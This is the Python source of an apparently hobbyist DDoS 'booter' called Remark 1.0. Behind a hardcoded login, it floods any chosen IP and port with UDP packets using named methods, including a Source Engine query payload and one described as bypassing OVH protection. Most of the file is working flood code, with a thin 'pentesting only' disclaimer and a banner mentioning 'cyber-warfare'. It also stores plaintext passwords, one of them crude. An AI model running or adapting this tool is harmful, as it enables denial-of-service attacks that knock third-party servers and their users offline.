#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json

nicknm = "hg"

methods = """
Layer4: Layer4 Attacks to test firewalls and what not (shouldnt be used on websites)
====================================================================================
thats is for now and most likely for ever since this is no longer a project :(
"""
user = """
                   ╔═════════════════════════════╗
                   ║     Welcome To Remark 1.0   ║
                   ║ Please Enter your Username  ║
                   ║ In the Login Prompt Below   ║
                   ╚═════════════════════════════╝
              ╔═════════════════════════════════════╗
              ║        This Source Code is          ║
              ║      Licensed under GPU V3.0        ║
              ║  FOR ALLOWED USE IN 'CYBER-WARFARE' ║
              ╚═════════════════════════════════════╝
"""
passw = """
                   ╔═════════════════════════════╗
                   ║     Welcome To Remark 1.0   ║
                   ║ Please Enter your Password  ║
                   ║ In the Login Prompt Below   ║
                   ╚═════════════════════════════╝
              ╔═════════════════════════════════════╗
              ║        This Source Code is          ║
              ║      Licensed under GPU V3.0        ║
              ║  FOR ALLOWED USE IN 'CYBER-WARFARE' ║
              ╚═════════════════════════════════════╝
"""



layer4 = """
udp [IP] [TIME] [PORT]
tcp [IP] [TIME] [PORT]
std [IP] [TIME] [PORT]
syn [IP] [TIME] [PORT]
vse [IP] [TIME] [PORT]
ack [IP] [TIME] [PORT]
dns [IP] [TIME] [PORT]
ovh [IP] [TIME] [PORT]
"""

banner =  """
                                                        [95mRemark [96mv [91m1.0
                                                           EskaX
                                         [00m===============================================   
                                         Hello Again Community.This is my 25th version of        |
                                         Remark all coded by EskaX And Vps provided by fallout.  |
                                         I have been working on this for a while before i lost 
                                         motivation to actually finish it. Please keep in mind 
                                         That this is unfinished work and i have no desire to
                                         actually finish it :). Also keep in mind that this is
                                         A pentesting tools for testing your personal servers only
                                         or if you have permision to pentest someone else's server
                                         I take no responsibility for what you do and i will not be
                                         held reliable for any illegal action done with this project
                                                           until next time [95mE[91s[92mk[96ma[95mX |
                                       [00m =================================================== 
"""

cookie = open(".Eska_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):  # rand sender (not actually used for any methods)
    global iaid
    global aid
    global tattacks
    global running

    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

    iaid += 1
    aid += 1
    tattacks += 1
    running += 1
    while time.time() < timeout and ldap and attack:
        sock.sendto(punch, (host, int(port)))
    running -= 1
    iaid -= 1
    aid -= 1


def stdsender(host, port, timer, payload):  # Special Snder for STD attacks :)
    global atks
    global running

    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
    atks -= 1
    running -= 1

def main():
    global fsubs
    global tpings
    global pscans
    global liips
    global tattacks
    global uaid
    global running
    global atk
    global ldap
    global said
    global iaid
    global haid
    global aid
    global attack
    global dp

    while True:

        sys.stdout.write("\x1b]2;EskaX\x07") # just want to look fancy ;) 
        sin = input("\033[32m[\033[95m{}\033[96m@Remark]\033[00m> \033[96m".format(nicknm)).lower() # yk
        sinput = sin.split(" ")[0]
        if sinput == "clear":
            os.system ("clear")
            print (banner)
            main()
        if sinput == "other":
            os.system ("clear")
            print (other)
            main()                                       
        elif sinput == "layer4": # print out the layer4 Screen
            os.system ("clear")
            print (layer4)
            main()
        elif sinput == "method": # just in case you forget the s
            os.system ("clear")
            print (methods)
            main()
        elif sinput == "methods": # Print the Method screen
            os.system ("clear")
            print (methods)
            main()
        elif sinput == "exit": # adios amigos
            os.system ("clear")
            exit()
        elif sinput == "std":
            try:
                if running >= 1:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.") # to not overflow your own server with outoging trafic
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\x73\x74\x64\x00\x00\x00\x00\x00" #custom payload :)
                    threading.Thread(target=stdsender, args=(host, port, timer, payload)).start() # use the std sender to send a packet to a host and port
                    print("\033[97mYour Attack Has Been Launched!")
            except ValueError:
                main()
            except socket.gaierror:
                main()
        elif sinput == "dns":
            try:
                if running >= 1:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00" # custom payload :)
                    threading.Thread(target=stdsender, args=(host, port, timer, payload)).start() # uses the same std sender just using the specified payload
                    print("\033[97mYour Attack Has Been Launched!")
            except ValueError:
                main()
            except socket.gaierror:
                main()
        elif sinput == "ovh": # meant for bypassing ovh's
            try:
                if running >= 1:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                        sinput, host, timer, port = sin.split(" ")
                        socket.gethostbyname(host)
                        payload = b"\x00\x02\x00\x2f" #outdated ass payload please change
                        threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                        print("\033[97mYour Attack Has Been Launched!")
            except ValueError:
                main()
            except socket.gaierror:
                main()
        elif sinput == "vse":
            try:
                if running >= 1:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                        sinput, host, timer, port = sin.split(" ")
                        socket.gethostbyname(host)
                        payload = b"\xff\xff\xff\xffTSource Engine Query\x00" # :)
                        threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                        print("\033[97mYour Attack Has Been Launched!")
            except ValueError:
                main()
            except socket.gaierror:
                main()
        elif sinput == "syn":
            try:
                if running >= 1:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                        sinput, host, timer, port = sin.split(" ")
                        socket.gethostbyname(host)
                        payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58" # big boy payload
                        threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                        print("\033[97mYour Attack Has Been Launched!")
            except ValueError:
                main()
            except socket.gaierror:
                main()                      
        elif sinput == "stopattacks": #stop them attacks brother
            attack = False
            while not attack:
                if aid == 0:
                    attack = True
        elif sinput == "stop":
            attack = False
            while not attack:
                if aid == 0:
                    attack = True

        else:
            main()
try:
    users = ["hg", "guests", "me"] # to lazy to make register system for this just use these clown
    clear = "clear"
    os.system (clear)
    print (user)
    username = getpass.getpass ("[Username: ")
    if username in users:
        user = username
    else:
        print ("[+] Incorrect, exiting")
        exit()
except KeyboardInterrupt:
    print ("\nCTRL-C Pressed")
    exit()
try:
    passwords = ["hg", "gayman", "me"]
    print (passw)
    password = getpass.getpass ("[Password: ")
    if user == "hg":
        if password == passwords[0]:
            print ("[Login correct")
            cookie.write("DIE")
            time.sleep(2)
            os.system (clear)
            try:
                os.system ("clear")
                print (banner)
                main()
            except KeyboardInterrupt:
                print ("\n[\033[91mSIN\033[00m] CTRL has been pressed")
                main()
        else:
            print ("[+] Incorrect, exiting")
            exit()
    if user == "guests":
        if password == passwords[1]:
            print ("[+] Login correct")
            print ("[+] Certain methods will not be available to you")
            time.sleep(4)
            os.system (clear)
            try:
                os.system ("clear")
                print (banner)
                main()
            except KeyboardInterrupt:
                print ("\n[\033[91mSIN\033[00m] CTRL has been pressed")
                main()
        else:
            print ("[+] Incorrect, exiting")
            exit()
except KeyboardInterrupt:
    exit()          
try:
    clear = "clear"
    os.system(clear)
    print(banner)
    main()
except KeyboardInterrupt:
    exit()
# You're already leaving me :(
# oh well
# Made By EskaX (dont take credit for my shit thx)
